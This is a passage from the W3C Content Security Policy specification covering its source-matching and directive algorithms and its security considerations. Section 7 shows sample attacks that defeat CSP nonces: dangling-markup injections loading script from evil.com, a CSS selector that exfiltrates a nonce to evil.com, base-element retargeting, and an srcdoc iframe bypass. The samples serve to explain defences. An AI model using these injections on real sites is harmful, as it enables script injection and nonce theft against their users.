 [scheme](https://html.spec.whatwg.org/multipage/browsers.html#concept-origin-scheme) does not [`scheme-part`
 match](#scheme-part-match) `url`'s
 [scheme](https://url.spec.whatwg.org/#concept-url-scheme), return \"`Does Not Match`\".

 As with
 [`scheme-part`](#grammardef-scheme-part) above, we allow schemeless
 [`host-source`](#grammardef-host-source) expressions to be upgraded from insecure
 schemes to secure schemes.

 3. If `expression`'s
 [`host-part`](#grammardef-host-part) does not [`host-part`
 match](#host-part-match) `url`'s
 [`host`](https://url.spec.whatwg.org/#dom-url-host), return \"`Does Not Match`\".

 4. Let `port-part` be `expression`'s
 [`port-part`](#grammardef-port-part) if present, and null otherwise.

 5. If `port-part` does not [`port-part`
 match](#port-part-matches) `url`, return \"`Does Not Match`\".

 6. If `expression` contains a non-empty
 [`path-part`](#grammardef-path-part), and `redirect count` is 0,
 then:

 1. Let `path` be the result of running the [URL path
 serializer](https://url.spec.whatwg.org/#url-path-serializer) on `url`.

 2. If `expression`'s
 [`path-part`](#grammardef-path-part) does not [`path-part`
 match](#path-part-match) `path`, return
 \"`Does Not Match`\".

 7. Return \"`Matches`\".

4. If `expression` is an [ASCII
 case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for \"`'self'`\", return \"`Matches`\" if one
 or more of the following conditions is met:

 1. `origin` is the same as `url`'s
 [origin](https://url.spec.whatwg.org/#concept-url-origin)

 2. `origin`'s
 [`host`](https://url.spec.whatwg.org/#dom-url-host) is the same as `url`'s
 [`host`](https://url.spec.whatwg.org/#dom-url-host), `origin`'s
 [`port`](https://url.spec.whatwg.org/#dom-url-port) and `url`'s
 [`port`](https://url.spec.whatwg.org/#dom-url-port) are either the same or the [default
 ports](https://url.spec.whatwg.org/#default-port) for their respective
 [scheme](https://url.spec.whatwg.org/#concept-url-scheme)s, and one or more of the following conditions
 is met:

 1. `url`'s
 [scheme](https://url.spec.whatwg.org/#concept-url-scheme) is \"`https`\" or \"`wss`\"

 2. `origin`'s
 [scheme](https://url.spec.whatwg.org/#concept-url-scheme) is \"`http`\" and `url`'s
 [scheme](https://url.spec.whatwg.org/#concept-url-scheme) is \"`http`\" or \"`ws`\"

 Like the
 [`scheme-part`](#grammardef-scheme-part) logic above, the \"`'self'`\" matching
 algorithm allows upgrades to secure schemes when it is safe to do
 so. We limit these upgrades to endpoints running on the default port
 for a particular scheme or a port that matches the origin of the
 protected resource, as this seems sufficient to deal with upgrades
 that can be reasonably expected to succeed.

5. Return \"`Does Not Match`\".

##### 6.7.2.9. `scheme-part` matching

An [ASCII
string](https://infra.spec.whatwg.org/#ascii-string) [`scheme-part` matches] another
[ASCII
string](https://infra.spec.whatwg.org/#ascii-string) if a CSP source expression that contained the first as
a
[`scheme-part`](#grammardef-scheme-part) could potentially match a URL containing the latter
as a
[scheme](https://url.spec.whatwg.org/#concept-url-scheme). For example, we say that \"http\" [`scheme-part`
matches](#scheme-part-match) \"https\".

 The matching relation is asymmetric. For example, the
source expressions `https:` and `https://example.com/` do not match the
URL `http://example.com/`. We always allow a secure upgrade from an
explicitly insecure expression. `script-src http:` is treated as
equivalent to `script-src http: https:`, `script-src http://example.com`
to `script-src http://example.com https://example.com`, and
`connect-src ws:` to `connect-src ws: wss:`.

More formally, two [ASCII
strings](https://infra.spec.whatwg.org/#ascii-string) `A` and `B` are said to
[`scheme-part` match](#scheme-part-match) if the following algorithm returns \"`Matches`\":

1. If one of the following is true, return \"`Matches`\":

 1. `A` is an [ASCII
 case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for `B`.

 2. `A` is an [ASCII
 case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for \"`http`\", and `B` is an
 [ASCII
 case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for \"`https`\".

 3. `A` is an [ASCII
 case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for \"`ws`\", and `B` is an
 [ASCII
 case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for \"`wss`\", \"`http`\", or
 \"`https`\".

 4. `A` is an [ASCII
 case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for \"`wss`\", and `B` is an
 [ASCII
 case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for \"`https`\".

2. Return \"`Does Not Match`\".

##### 6.7.2.10. `host-part` matching

An [ASCII
string](https://infra.spec.whatwg.org/#ascii-string) [`host-part` matches] a
[host](https://url.spec.whatwg.org/#concept-host) if a CSP source expression that contained the first as
a [`host-part`](#grammardef-host-part) could potentially match the latter. For example, we
say that \"www.example.com\" [host-part
matches](#host-part-match)
\"www.example.com\".

More formally, [ASCII
string](https://infra.spec.whatwg.org/#ascii-string) `pattern` and
[host](https://url.spec.whatwg.org/#concept-host) `host` are said to [`host-part`
match](#host-part-match) if
the following algorithm returns \"`Matches`\":

 The matching relation is asymmetric. That is,
`pattern` matching `host` does not mean that
`host` will match `pattern`. For example,
`*.example.com` [`host-part`
matches](#host-part-match)
`www.example.com`, but `www.example.com` does not [`host-part`
match](#host-part-match)
`*.example.com`.

 A future version of this specification may allow
literal IPv6 and IPv4 addresses, depending on usage and demand. Given
the weak security properties of IP addresses in relation to named hosts,
however, authors are encouraged to prefer the latter whenever possible.

1. If `host` is not a
 [domain](https://url.spec.whatwg.org/#concept-domain), return \"`Does Not Match`\".

2. If `pattern` is \"`*`\", return \"`Matches`\".

3. If `pattern` [starts
 with](https://infra.spec.whatwg.org/#string-starts-with) \"`*.`\":

 1. Let `remaining` be `pattern` with the
 leading U+002A (`*`) removed and [ASCII
 lowercased](https://infra.spec.whatwg.org/#ascii-lowercase).

 2. If `host` to [ASCII
 lowercase](https://infra.spec.whatwg.org/#ascii-lowercase) [ends
 with](https://infra.spec.whatwg.org/#string-ends-with) `remaining`, then return
 \"`Matches`\".

 3. Return \"`Does Not Match`\".

4. If `pattern` is not an [ASCII
 case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for `host`, return
 \"`Does Not Match`\".

5. Return \"`Matches`\".

##### 6.7.2.11. `port-part` matching

An [ASCII
string](https://infra.spec.whatwg.org/#ascii-string) or null `input` [`port-part`
matches]
[URL](https://url.spec.whatwg.org/#concept-url) `url` if a CSP source expression that
contained the first as a
[`port-part`](#grammardef-port-part) could potentially match a URL containing the
latter's
[port](https://url.spec.whatwg.org/#concept-url-port) and
[scheme](https://url.spec.whatwg.org/#concept-url-scheme). For example, \"80\" [`port-part`
matches](#port-part-matches) matches http://example.com.

1. Assert: `input` is null, \"\*\", or a sequence of one or
 more [ASCII
 digits](https://infra.spec.whatwg.org/#ascii-digit).

2. If `input` is equal to \"\*\", return \"`Matches`\".

3. Let `normalizedInput` be null if `input` null;
 otherwise `input` interpreted as decimal number.

4. If `normalizedInput` equals `url`'s
 [port](https://url.spec.whatwg.org/#concept-url-port), return \"`Matches`\".

5. If `url`'s
 [port](https://url.spec.whatwg.org/#concept-url-port) is null:

 1. Let `defaultPort` be the [default
 port](https://url.spec.whatwg.org/#default-port) for `url`'s
 [scheme](https://url.spec.whatwg.org/#concept-url-scheme).

 2. If `normalizedInput` equals `defaultPort`,
 return \"`Matches`\".

6. Return \"`Does Not Match`\".

##### 6.7.2.12. `path-part` matching

An [ASCII
string](https://infra.spec.whatwg.org/#ascii-string) `path A` [`path-part`
matches] another [ASCII
string](https://infra.spec.whatwg.org/#ascii-string) `path B` if a CSP source expression that
contained the first as a
[`path-part`](#grammardef-path-part) could potentially match a URL containing the latter
as a
[path](https://url.spec.whatwg.org/#concept-url-path). For example, we say that \"/subdirectory/\"
[`path-part` matches](#path-part-match) \"/subdirectory/file\".

 The matching relation is asymmetric. That is,
`path A` matching `path B` does not mean that
`path B` will match `path A`.

1. If `path A` is the empty string, return \"`Matches`\".

2. If `path A` consists of one character that is equal to
 the U+002F SOLIDUS character (`/`) and `path B` is the
 empty string, return \"`Matches`\".

3. Let `exact match` be `false` if the final character of
 `path A` is the U+002F SOLIDUS character (`/`), and
 `true` otherwise.

4. Let `path list A` and `path list B` be the
 result of [strictly
 splitting](https://infra.spec.whatwg.org/#strictly-split) `path A` and `path B`
 respectively on the U+002F SOLIDUS character (`/`).

5. If `path list A` has more items than
 `path list B`, return \"`Does Not Match`\".

6. If `exact match` is `true`, and `path list A`
 does not have the same number of items as `path list B`,
 return \"`Does Not Match`\".

7. If `exact match` is `false`:

 1. Assert: the final item in `path list A` is the empty
 string.

 2. Remove the final item from `path list A`.

8. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `piece A` of `path list A`:

 1. Let `piece B` be the next item in
 `path list B`.

 2. Let `decoded piece A` be the
 [percent-decoding](https://url.spec.whatwg.org/#string-percent-decode) of `piece A`.

 3. Let `decoded piece B` be the
 [percent-decoding](https://url.spec.whatwg.org/#string-percent-decode) of `piece B`.

 4. If `decoded piece A` is not
 `decoded piece B`, return \"`Does Not Match`\".

9. Return \"`Matches`\".

#### 6.7.3. Element Matching Algorithms

##### 6.7.3.1. Is `element` nonceable?

Given an
[`Element`](https://dom.spec.whatwg.org/#element) `element`, this algorithm returns
\"`Nonceable`\" if a
[`nonce-source`](#grammardef-nonce-source) expression can match the element (as discussed in
[§ 7.2 Nonce Hijacking](#security-nonce-hijacking)), and
\"`Not Nonceable`\" if such expressions should not be applied.

1. If `element` does not have an attribute named
 \"`nonce`\", return \"`Not Nonceable`\".

2. If `element` is a
 [`script`](https://html.spec.whatwg.org/multipage/scripting.html#script) element, then [for
 each](https://infra.spec.whatwg.org/#list-iterate) `attribute` of `element`'s
 [attribute
 list](https://dom.spec.whatwg.org/#concept-element-attribute):

 1. If `attribute`'s name contains an [ASCII
 case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for \"`<script`\" or \"`<style`\", return
 \"`Not Nonceable`\".

 2. If `attribute`'s value contains an [ASCII
 case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for \"`<script`\" or \"`<style`\", return
 \"`Not Nonceable`\".

3. If `element` had a
 [duplicate-attribute](https://html.spec.whatwg.org/multipage/parsing.html#parse-error-duplicate-attribute) [parse
 error](https://html.spec.whatwg.org/multipage/images.html#concept-microsyntax-parse-error) during tokenization, return \"`Not Nonceable`\".

 (#issue-820579ab) We need some sort of hook in HTML to
 record this error if we're planning on using it here. [\[whatwg/html
 Issue #3257\]](https://github.com/whatwg/html/issues/3257)

4. Return \"`Nonceable`\".

This processing is meant to mitigate the
risk of dangling markup attacks that steal the nonce from an existing
element in order to load injected script. It is fairly expensive,
however, as it requires that we walk through all attributes and their
values in order to determine whether the script should execute. Here, we
try to minimize the impact by doing this check only for
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script) elements when a nonce is present, but we should
probably consider this algorithm as \"at risk\" until we know its
impact. [\[w3c/webappsec-csp Issue
#98\]](https://github.com/w3c/webappsec-csp/issues/98)

##### 6.7.3.2. Does a source list allow all inline behavior for `type`?

A [source list](#source-lists)
[allows all inline behavior] of a given `type` if it
contains the
[`keyword-source`](#grammardef-keyword-source) expression
[`'unsafe-inline'`](#grammardef-unsafe-inline), and does not override that expression as described
in the following algorithm:

Given a [source list](#source-lists) `list` and a string `type`, the
following algorithm returns \"`Allows`\" if all inline content of a
given `type` is allowed and \"`Does Not Allow`\" otherwise.

1. Let `allow all inline` be `false`.

2. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `expression` of `list`:

 1. If `expression` matches the
 [`nonce-source`](#grammardef-nonce-source) or
 [`hash-source`](#grammardef-hash-source) grammar, return \"`Does Not Allow`\".

 2. If `type` is \"`script`\", \"`script attribute`\" or
 \"`navigation`\" and `expression` matches the
 [keyword-source](#grammardef-keyword-source)
 \"[`'strict-dynamic'`](#grammardef-strict-dynamic)\", return \"`Does Not Allow`\".

 `'strict-dynamic'` only applies to scripts, not
 other resource types. Usage is explained in more detail in
 [§ 8.2 Usage of \"\'strict-dynamic\'\"](#strict-dynamic-usage).

 3. If `expression` is an [ASCII
 case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for the
 [`keyword-source`](#grammardef-keyword-source)
 \"[`'unsafe-inline'`](#grammardef-unsafe-inline)\", set `allow all inline` to
 `true`.

3. If `allow all inline` is `true`, return \"`Allows`\".
 Otherwise, return \"`Does Not Allow`\".

[Source
lists](#source-lists) that
[allow all inline
behavior](#source-list-allows-all-inline-behavior):

 'unsafe-inline' http://a.com http://b.com
 'unsafe-inline'

[Source lists](#source-lists)
that do not [allow all inline
behavior](#source-list-allows-all-inline-behavior) due to the presence of nonces and/or hashes, or absence
of \'`unsafe-inline`\':

 'sha512-321cba' 'nonce-abc'
 http://example.com 'unsafe-inline' 'nonce-abc'

[Source lists](#source-lists)
that do not [allow all inline
behavior](#source-list-allows-all-inline-behavior) when `type` is \'`script`\' or
\'`script attribute`\' due to the presence of \'`strict-dynamic`\', but
[allow all inline
behavior](#source-list-allows-all-inline-behavior) otherwise:

 'unsafe-inline' 'strict-dynamic'
 http://example.com 'strict-dynamic' 'unsafe-inline'

##### 6.7.3.3. Does `element` match source list for `type` and `source`?

Given an
[`Element`](https://dom.spec.whatwg.org/#element) `element`, a [source
list](#source-lists)
`list`, a string `type`, and a string
`source`, this algorithm returns \"`Matches`\" or
\"`Does Not Match`\".

 Regardless of the encoding of the document,
`source` will be converted to `UTF-8` before applying any
hashing algorithms.

1. If [§ 6.7.3.2 Does a source list allow all inline behavior for
 type?](#allow-all-inline) returns \"`Allows`\" given
 `list` and `type`, return \"`Matches`\".

2. If `type` is \"`script`\" or \"`style`\", and [§ 6.7.3.1
 Is element nonceable?](#is-element-nonceable) returns
 \"`Nonceable`\" when executed upon `element`:

 1. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `expression` of `list`:

 1. If `expression` matches the
 [`nonce-source`](#grammardef-nonce-source) grammar, and `element` has a
 [`nonce`](https://html.spec.whatwg.org/multipage/urls-and-fetching.html#attr-nonce) attribute whose value
 [is](https://infra.spec.whatwg.org/#string-is) `expression`'s
 [`base64-value`](#grammardef-base64-value) part, return \"`Matches`\".

 Nonces only apply to inline
 [`script`](https://html.spec.whatwg.org/multipage/scripting.html#script) and inline
 [`style`](https://html.spec.whatwg.org/multipage/semantics.html#the-style-element), not to attributes of either element or to
 `javascript:` navigations.

3. Let `unsafe-hashes flag` be `false`.

4. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `expression` of `list`:

 1. If `expression` is an [ASCII
 case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for the
 [`keyword-source`](#grammardef-keyword-source)
 \"[`'unsafe-hashes'`](#grammardef-unsafe-hashes)\", set `unsafe-hashes flag` to
 `true`. Break out of the loop.

5. If `type` is \"`script`\" or \"`style`\", or
 `unsafe-hashes flag` is `true`:

 1. Set `source` to the result of executing [UTF-8
 encode](https://encoding.spec.whatwg.org/#utf-8-encode) on the result of executing [JavaScript string
 converting](https://infra.spec.whatwg.org/#javascript-string-convert) on `source`.

 2. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `expression` of `list`:

 1. If `expression` is the
 \"[`'strict-dynamic'`](#grammardef-strict-dynamic)\"
 [keyword-source](#grammardef-keyword-source):

 1. If `type` is \"`script`\", and
 `element` is not
 [parser-inserted](https://html.spec.whatwg.org/multipage/scripting.html#parser-inserted), return \"`Matches`\".

 2. If `expression` matches the
 [`hash-source`](#grammardef-hash-source) grammar:

 1. Let `algorithm` be null.

 2. If `expression`'s
 [`hash-algorithm`](#grammardef-hash-algorithm) part is an [ASCII
 case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for \"sha256\", set
 `algorithm` to
 [SHA-256](https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.180-4.pdf#).

 3. If `expression`'s
 [`hash-algorithm`](#grammardef-hash-algorithm) part is an [ASCII
 case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for \"sha384\", set
 `algorithm` to
 [SHA-384](https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.180-4.pdf#).

 4. If `expression`'s
 [`hash-algorithm`](#grammardef-hash-algorithm) part is an [ASCII
 case-insensitive](https://infra.spec.whatwg.org/#ascii-case-insensitive) match for \"sha512\", set
 `algorithm` to
 [SHA-512](https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.180-4.pdf#).

 5. If `algorithm` is not null:

 1. Let `actual` be the result of [base64
 encoding](https://tools.ietf.org/html/rfc4648#section-4) the result of applying
 `algorithm` to `source`.

 2. Let `expected` be
 `expression`'s
 [`base64-value`](#grammardef-base64-value) part, with all \'`-`\'
 characters replaced with \'`+`\', and all \'`_`\'
 characters replaced with \'`/`\'.

 This replacement normalizes hashes
 expressed in [base64url
 encoding](https://tools.ietf.org/html/rfc4648#section-5) into [base64
 encoding](https://tools.ietf.org/html/rfc4648#section-4) for matching.

 3. If `actual` is [identical
 to](https://infra.spec.whatwg.org/#string-is) `expected`, return
 \"`Matches`\".

 Hashes apply to inline
 [`script`](https://html.spec.whatwg.org/multipage/scripting.html#script) and inline
 [`style`](https://html.spec.whatwg.org/multipage/semantics.html#the-style-element). If the
 \"[`'unsafe-hashes'`](#grammardef-unsafe-hashes)\" source expression is present, they will also
 apply to event handlers, style attributes and `javascript:`
 navigations.

6. Return \"`Does Not Match`\".

### 6.8. Directive Algorithms

#### 6.8.1. Get the effective directive for `request`

Each [fetch directive](#fetch-directives) controls a specific destination of
[request](https://fetch.spec.whatwg.org/#concept-request). Given a
[request](https://fetch.spec.whatwg.org/#concept-request) `request`, the following algorithm returns
either null or the [name](#directive-name) of the request's [effective
directive]:

1. If `request`'s
 [initiator](https://fetch.spec.whatwg.org/#concept-request-initiator) is \"`prefetch`\" or \"`prerender`\", return
 `default-src`.

2. Switch on `request`'s
 [destination](https://fetch.spec.whatwg.org/#concept-request-destination), and execute the associated steps:

 the empty string

 : 1. Return `connect-src`.

 \"`manifest`\"

 : 1. Return `manifest-src`.

 \"`object`\"\
 \"`embed`\"

 : 1. Return `object-src`.

 \"`frame`\"\
 \"`iframe`\"

 : 1. Return `frame-src`.

 \"`audio`\"\
 \"`track`\"\
 \"`video`\"

 : 1. Return `media-src`.

 \"`font`\"

 : 1. Return `font-src`.

 \"`image`\"

 : 1. Return `img-src`.

 \"`style`\"

 : 1. Return `style-src-elem`.

 \"`script`\"\
 \"`xslt`\"\
 \"`audioworklet`\"\
 \"`paintworklet`\"

 : 1. Return `script-src-elem`.

 \"`serviceworker`\"\
 \"`sharedworker`\"\
 \"`worker`\"

 : 1. Return `worker-src`.

 \"`json`\"\
 \"`webidentity`\"

 : 1. Return `connect-src`.

 \"`report`\"

 : 1. Return null.

3. Return `connect-src`.

 The algorithm returns `connect-src` as a default
fallback. This is intended for new fetch destinations that are added and
which don't explicitly fall into one of the other categories.

#### 6.8.2. Get the effective directive for inline checks

Given a string `type`, this algorithm returns the
[name](#directive-name) of
the effective directive.

 While the [effective
directive](#request-effective-directive) is only defined for
[requests](https://fetch.spec.whatwg.org/#concept-request), in this algorithm it is used similarly to mean the
directive that is most relevant to a particular type of inline check.

1. Switch on `type`:

 \"`script`\"\
 \"`navigation`\"

 : 1. Return `script-src-elem`.

 \"`script attribute`\"

 : 1. Return `script-src-attr`.

 \"`style`\"

 : 1. Return `style-src-elem`.

 \"`style attribute`\"

 : 1. Return `style-src-attr`.

2. Return null.

#### 6.8.3. Get fetch directive fallback list

Will return an [ordered
set](https://infra.spec.whatwg.org/#ordered-set) of the fallback
[directives](#directives) for a
specific [directive](#directives). The returned [ordered
set](https://infra.spec.whatwg.org/#ordered-set) is sorted from most relevant to least relevant and it
includes the effective directive itself.

Given a string `directive name`:

1. Switch on `directive name`:

 \"`script-src-elem`\"

 : 1. Return
 `<< "script-src-elem", "script-src", "default-src" >>`.

 \"`script-src-attr`\"

 : 1. Return
 `<< "script-src-attr", "script-src", "default-src" >>`.

 \"`style-src-elem`\"

 : 1. Return `<< "style-src-elem", "style-src", "default-src" >>`.

 \"`style-src-attr`\"

 : 1. Return `<< "style-src-attr", "style-src", "default-src" >>`.

 \"`worker-src`\"

 : 1. Return
 `<< "worker-src", "child-src", "script-src", "default-src" >>`.

 \"`connect-src`\"

 : 1. Return `<< "connect-src", "default-src" >>`.

 \"`manifest-src`\"

 : 1. Return `<< "manifest-src", "default-src" >>`.

 \"`object-src`\"

 : 1. Return `<< "object-src", "default-src" >>`.

 \"`frame-src`\"

 : 1. Return `<< "frame-src", "child-src", "default-src" >>`.

 \"`media-src`\"

 : 1. Return `<< "media-src", "default-src" >>`.

 \"`font-src`\"

 : 1. Return `<< "font-src", "default-src" >>`.

 \"`img-src`\"

 : 1. Return `<< "img-src", "default-src" >>`.

2. Return `<< >>`.

#### 6.8.4. Should fetch directive execute

This algorithm is used for [fetch
directives](#fetch-directives) to decide whether a directive should execute or defer
to a different directive that is better suited. For example: if the
`effective directive name` is `worker-src` (meaning that we
are currently checking a worker request), a `default-src` directive
should not execute if a `worker-src` or `script-src` directive exists.

Given a string `effective directive name`, a string
`directive name` and a
[policy](#content-security-policy-object) `policy`:

1. Let `directive fallback list` be the result of executing
 [§ 6.8.3 Get fetch directive fallback
 list](#directive-fallback-list) on
 `effective directive name`.

2. [For
 each](https://infra.spec.whatwg.org/#list-iterate) `fallback directive` of
 `directive fallback list`:

 1. If `directive name` is
 `fallback directive`, Return \"`Yes`\".

 2. If `policy` contains a directive whose
 [name](#directive-name) is `fallback directive`, Return
 \"`No`\".

3. Return \"`No`\".

## 7. Security and Privacy Considerations

### 7.1. Nonce Reuse

Nonces override the other restrictions present in the directive in which
they're delivered. It is critical, then, that they remain unguessable,
as bypassing a resource's policy is otherwise trivial.

If a server delivers a
[nonce-source](#grammardef-nonce-source) expression as part of a
[policy](#content-security-policy-object), the server MUST generate a unique value each time it
transmits a policy. The generated value SHOULD be at least 128 bits long
(before encoding), and SHOULD be generated via a cryptographically
secure random number generator in order to ensure that the value is
difficult for an attacker to predict.

 Using a nonce to allow inline script or style is less
secure than not using a nonce, as nonces override the restrictions in
the directive in which they are present. An attacker who can gain access
to the nonce can execute whatever script they like, whenever they like.
That said, nonces provide a substantial improvement over
[\'unsafe-inline\'](#grammardef-unsafe-inline) when layering a content security policy on top of
old code. When considering
[\'unsafe-inline\'](#grammardef-unsafe-inline), authors are encouraged to consider nonces (or
hashes) instead.

### 7.2. Nonce Hijacking

#### 7.2.1. Dangling markup attacks

Dangling markup attacks such as those discussed in
[\[FILEDESCRIPTOR-2015\]](#biblio-filedescriptor-2015 "CSP 2015")
can be used to repurpose a page's legitimate nonces for injections. For
example, given an injection point before a
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script) element:

``` highlight
<p>Hello, [INJECTION POINT]</p>
<script nonce=abc src=/good.js></script>
```

If an attacker injects the string
\"`<script src='https://evil.com/evil.js' `\", then the browser will
receive the following:

``` highlight
<p>Hello, <script src='https://evil.com/evil.js' </p>
<script nonce=abc src=/good.js></script>
```

It will then parse that code, ending up with a
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script) element with a `src` attribute pointing to a
malicious payload, an attribute named `</p>`, an attribute named
\"`<script`\", a `nonce` attribute, and a second `src` attribute which
is helpfully discarded as duplicate by the parser.

The [§ 6.7.3.1 Is element nonceable?](#is-element-nonceable) algorithm
attempts to mitigate this specific attack by walking through
[`script`](https://html.spec.whatwg.org/multipage/scripting.html#script) or
[`style`](https://html.spec.whatwg.org/multipage/semantics.html#the-style-element) element attributes, looking for the string
\"`<script`\" or \"`<style`\" in their names or values.

User-agents must pay particular attention when implementing this
algorithm to not ignore duplicate attributes. If an element has a
duplicate attribute any instance of the attribute after the first one is
ignored but in the [§ 6.7.3.1 Is element
nonceable?](#is-element-nonceable) algorithm, all attributes including
the duplicate ones need to be checked.

Currently the HTML spec's parsing
algorithm removes this information before the [§ 6.7.3.1 Is element
nonceable?](#is-element-nonceable) algorithm can be run which makes it
impossible to actually detect duplicate attributes. [\[whatwg/html Issue
#3257\]](https://github.com/whatwg/html/issues/3257)

For the following example page:

``` highlight
Hello, [INJECTION POINT]
<script nonce=abc src=/good.js></script>
```

The following injected string will use a duplicate attribute to attempt
to bypass the [§ 6.7.3.1 Is element nonceable?](#is-element-nonceable)
algorithm check:

``` highlight
Hello, <script src='https://evil.com/evil.js' x="" x=
<script nonce="abcd" src=/good.js></script>
```

#### 7.2.2. Nonce exfiltration via content attributes

Some attacks on CSP rely on the ability to exfiltrate nonce data via
various mechanisms that can read content attributes. CSS selectors are
the best example: through clever use of prefix/postfix text matching
selectors values can be sent out to an attacker's server for reuse.
Example:

``` highlight
script[nonce=a] { background: url("https://evil.com/nonce?a");}
```

The
[`nonce`](https://html.spec.whatwg.org/multipage/urls-and-fetching.html#attr-nonce) section talks about mitigating these types of
attacks by hiding the nonce from the element's content attribute and
moving it into an internal slot. This is done to ensure that the `nonce`
value is exposed to scripts but not any other non-script channels.

### 7.3. Nonce Retargeting

Nonces bypass
[host-source](#grammardef-host-source) expressions, enabling developers to load code from
any origin. This, generally, is fine, and desirable from the developer's
perspective. However, if an attacker can inject a
[`base`](https://html.spec.whatwg.org/multipage/semantics.html#the-base-element) element, then an otherwise safe page can be
subverted when relative URLs are resolved. That is, on
`https://example.com/` the following code will load
`https://example.com/good.js`:

``` highlight
<script nonce=abc src=/good.js></script>
```

However, the following will load `https://evil.com/good.js`:

``` highlight
<base href="https://evil.com">
<script nonce=abc src=/good.js></script>
```

To mitigate this risk, it is advisable to set an explicit
[`base`](https://html.spec.whatwg.org/multipage/semantics.html#the-base-element) element on every page, or to limit the ability of
an attacker to inject their own
[`base`](https://html.spec.whatwg.org/multipage/semantics.html#the-base-element) element by setting a
[`base-uri`](#base-uri) directive in
your page's policy. For example, `base-uri 'none'`.

### 7.4. CSS Parsing

The [style-src](#style-src)
directive restricts the locations from which the protected resource can
load styles. However, if the user agent uses a lax CSS parsing
algorithm, an attacker might be able to trick the user agent into
accepting malicious \"stylesheets\" hosted by an otherwise trustworthy
origin.

These attacks are similar to the CSS cross-origin data leakage attack
described by Chris Evans in 2009
[\[CSS-ABUSE\]](#biblio-css-abuse "Generic cross-browser cross-domain theft").
User agents SHOULD defend against both attacks using the same mechanism:
stricter CSS parsing rules for style sheets with improper MIME types.

### 7.5. Violation Reports

The violation reporting mechanism in this document has been designed to
mitigate the risk that a malicious web site could use violation reports
to probe the behavior of other servers. For example, consider a
malicious web site that allows `https://example.com` as a source of
images. If the malicious site attempts to load
`https://example.com/login` as an image, and the `example.com` server
redirects to an identity provider (e.g. `identityprovider.example.net`),
CSP will block the request. If violation reports contained the full
blocked URL, the violation report might contain sensitive information
contained in the redirected URL, such as session identifiers or
purported identities. For this reason, the user agent includes only the
URL of the original request, not the redirect target.

Note also that violation reports should be considered
attacker-controlled data. Developers who wish to collect violation
reports in a dashboard or similar service should be careful to properly
escape their content before rendering it (and should probably themselves
use CSP to further mitigate the risk of injection). This is especially
true for the \"`script-sample`\" property of violation reports, and the
[`sample`](#dom-securitypolicyviolationevent-sample) property of
[`SecurityPolicyViolationEvent`](#securitypolicyviolationevent), which are both completely attacker-controlled strings.

### 7.6. Paths and Redirects

To avoid leaking path information cross-origin (as discussed in Egor
Homakov's [Using Content-Security-Policy for
Evil](https://homakov.blogspot.de/2014/01/using-content-security-policy-for-evil.html)),
the matching algorithm ignores the path component of a source expression
if the resource being loaded is the result of a redirect. For example,
given a page with an active policy of
[`img-src`](#img-src)` example.com example.org/path`:

- Directly loading `https://example.org/not-path` would fail, as it
 doesn't match the policy.

- Directly loading `https://example.com/redirector` would pass, as it
 matches `example.com`.

- Assuming that `https://example.com/redirector` delivered a redirect
 response pointing to `https://example.org/not-path`, the load would
 succeed, as the initial URL matches `example.com`, and the redirect
 target matches `example.org/path` if we ignore its path component.

This restriction reduces the granularity of a document's policy when
redirects are in play, a necessary compromise to avoid brute-forced
information leaks of this type.

The relatively long thread [\"Remove paths from
CSP?\"](https://lists.w3.org/Archives/Public/public-webappsec/2014Feb/0036.html)
from public-webappsec@w3.org has more detailed discussion around
alternate proposals.

### 7.7. Secure Upgrades

To mitigate one variant of history-scanning attacks like Yan Zhu's
[Sniffly](http://diracdeltas.github.io/sniffly/), CSP will not allow
pages to lock themselves into insecure URLs via policies like
`script-src http://example.com`. As described in [§ 6.7.2.9 scheme-part
matching](#match-schemes), the scheme portion of a source expression
will always allow upgrading to a secure variant.

### 7.8. CSP Inheriting to avoid bypasses

Documents loaded from [local
schemes](https://fetch.spec.whatwg.org/#local-scheme) will inherit a copy of the policies in the source
document. The goal is to ensure that a page can't bypass its policy by
embedding a frame or opening a new window containing content that is
entirely under its control (`srcdoc` documents, `blob:` or `data:` URLs,
`about:blank` documents that can be manipulated via `document.write()`,
etc).

If this would not happen a page could
execute inline scripts even without `unsafe-inline` in the page's
execution context by simply embedding a `srcdoc` `iframe`.

``` highlight
<iframe srcdoc="<script>alert(1);</script>"></iframe>
```

Note that we create a copy of the [CSP
list](#global-object-csp-list) which means that the new
[`Document`](https://dom.spec.whatwg.org/#document)'s [CSP
list](#global-object-csp-list) is a snapshot of the relevant policies at its creation
time. Modifications in the [CSP
list](#global-object-csp-list) of the new
[`Document`](https://dom.spec.whatwg.org/#document) won't affect the source
[`Document`](https://dom.spec.whatwg.org/#document)'s [CSP
list](#global-object-csp-list) or vice-versa.

In the example below the image inside
the iframe will not load because it is blocked by the policy in the
`meta` tag of the iframe. The image outside the iframe will load
(assuming the main page policy does not block it) since the policy
inserted in the iframe will not affect it.

``` highlight
<iframe srcdoc='<meta http-equiv="Content-Security-Policy" content="img-src example.com;">
 <img src="not-example.com/image">'></iframe>

<img src="not-example.com/image">
```

## 8. Authoring Considerations

### 8.1. The effect of multiple policies

